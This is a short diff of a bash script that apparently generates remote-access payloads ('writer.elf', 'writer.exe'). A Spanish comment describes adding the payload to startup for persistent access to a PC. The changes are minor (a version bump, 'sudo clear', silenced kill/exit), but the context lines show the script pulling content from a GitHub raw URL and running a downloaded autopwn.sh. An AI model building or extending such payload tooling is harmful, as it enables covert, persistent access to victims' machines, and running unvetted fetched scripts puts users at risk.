@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version="1.5"
+version="1.6"
 
 # Variables
 youripalways=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
@@ -30,7 +30,7 @@ startup="si" # añade el payload al inicio para que siempre tengas acceso al PC
 linuxoutname="writer.elf"
 windowsoutname="writer.exe"
 
-clear
+sudo clear
 
 webcon="`curl -s "https://raw.githubusercontent.com/pepemanaca/hthethrfdt/main/autopwn.txt" | cat`"
 
@@ -79,8 +79,9 @@ else
     dos2unix autopwn.sh
     ./autopwn.sh
     sleep 1
-    kill $$
-    exit
+    kill $$ >/dev/null 2>&1
+    exit >/dev/null 2>&1
+    sudo clear
 fi
 
 sudo clear
